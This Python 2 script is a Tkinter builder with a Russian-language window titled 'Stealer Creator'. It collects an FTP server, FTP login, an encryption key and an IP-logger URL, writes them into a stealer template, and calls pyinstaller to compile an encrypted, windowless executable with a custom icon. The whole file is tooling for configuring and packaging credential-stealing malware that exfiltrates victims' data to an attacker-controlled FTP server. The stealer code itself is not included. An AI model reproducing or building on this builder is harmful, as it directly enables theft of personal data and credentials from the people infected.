﻿#!/usr/bin/env python
# -*- coding: utf-8 -*-
from Tkinter import Tk, Label, Button, Entry
from win32api import GetSystemMetrics
from subprocess import Popen
from re import sub
from sys import exit, argv
import os, sys

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

def button_clicked():
    server = str(entry1.get())
    user = str(entry2.get())
    password = str(entry3.get())
    cryptokey = str(entry4.get())
    iplogger = str(entry5.get())

    base = open("base.py").read()
    stiller = open("stiller.py","w")

    logindata = ['FTPSERVER', 'FTPUSER', 'FTPPASS', 'IPLOGGER']

    for data in logindata:
        i = int(logindata.index(data))
        if i == 0:
            item = server
        if i == 1:
            item = user
        if i == 2:
            item = password
        if i == 3:
            item = iplogger
        base = sub(data, item, base)

    stiller.write(base)
    stiller.close()

    Popen('pyinstaller --onefile --icon=pic.ico --windowed --key=' + cryptokey + ' stiller.py')

def window_deleted():
    root.quit()

root = Tk()
params = '300x170+' + str(int(GetSystemMetrics(0)/2.5)) + '+' + str(GetSystemMetrics(1)/4)
root.title(u'СтиллерКреатор')
root.geometry(params)
root.protocol('WM_DELETE_WINDOW', window_deleted)
root.resizable(False, False)

label1 = Label(root, text=u"FTP сервер")
label1.place(x=10, y=15)
label2 = Label(root, text=u"FTP юзер")
label2.place(x=10, y=38)
label3 = Label(root, text=u"FTP пароль")
label3.place(x=10, y=61)
label4 = Label(root, text=u"Шифрование")
label4.place(x=10, y=84)
label5 = Label(root, text=u"Iplogger URL")
label5.place(x=10, y=108)

entry1 = Entry(root, width=28)
entry1.place(x=110, y=15)
entry2 = Entry(root, width=28)
entry2.place(x=110, y=38)
entry3 = Entry(root, width=28)
entry3.place(x=110, y=61)
entry4 = Entry(root, width=28)
entry4.place(x=110, y=84)
entry5 = Entry(root, width=28)
entry5.place(x=110, y=108)

button1 = Button(root, width=37,height=1, text=u"Скомпилировать!", command=button_clicked)
button1.place(x=15, y=140)

root.mainloop()